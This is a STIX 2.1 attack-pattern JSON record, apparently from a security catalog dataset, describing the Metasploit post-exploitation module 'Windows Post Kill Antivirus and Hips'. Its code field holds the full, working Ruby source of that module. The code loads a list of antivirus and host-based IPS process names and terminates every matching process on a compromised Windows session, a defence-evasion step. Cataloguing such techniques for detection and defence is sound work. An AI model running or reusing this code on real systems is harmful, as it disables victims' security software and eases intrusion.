{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f0fd4a76-a6ac-4587-8919-a1881828396a",
    "created": "2024-08-14T16:33:04.988308Z",
    "modified": "2024-08-14T16:33:04.988312Z",
    "name": "Windows Post Kill Antivirus and Hips",
    "description": " This module attempts to locate and terminate any processes that are identified as being Antivirus or Host-based IPS related.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/killav.rb",
            "external_id": "killav.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Post Kill Antivirus and Hips',\n        'Description' => %q{\n          This module attempts to locate and terminate any processes that are identified\n          as being Antivirus or Host-based IPS related.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Marc-Andre Meloche (MadmanTM)',\n          'Nikhil Mittal (Samratashok)',\n          'Jerome Athias',\n          'OJ Reeves'\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => %w[meterpreter powershell shell],\n        'Notes' => {\n          'Stability' => [OS_RESOURCE_LOSS],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    avs = ::File.read(\n      ::File.join(\n        Msf::Config.data_directory,\n        'wordlists',\n        'av_hips_executables.txt'\n      )\n    )\n    avs = avs.strip.downcase.split(\"\\n\").uniq\n\n    skip_processes = [\n      '[system process]',\n      'system'\n    ]\n\n    av_processes = get_processes.reject { |p| skip_processes.include?(p['name'].downcase) }.keep_if { |p| avs.include?(p['name'.downcase]) }\n    if av_processes.empty?\n      print_status('No target processes were found.')\n      return\n    end\n\n    processes_killed = 0\n    av_processes.each do |x|\n      process_name = x['name']\n      pid = x['pid']\n\n      print_status(\"Attempting to terminate '#{process_name}' (PID: #{pid}) ...\")\n      if kill_process(pid)\n        processes_killed += 1\n        print_good(\"#{process_name} (PID: #{pid}) terminated.\")\n      else\n        print_error(\"Failed to terminate '#{process_name}' (PID: #{pid}).\")\n      end\n    end\n\n    print_good(\"A total of #{av_processes.length} process(es) were discovered, #{processes_killed} were terminated.\")\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}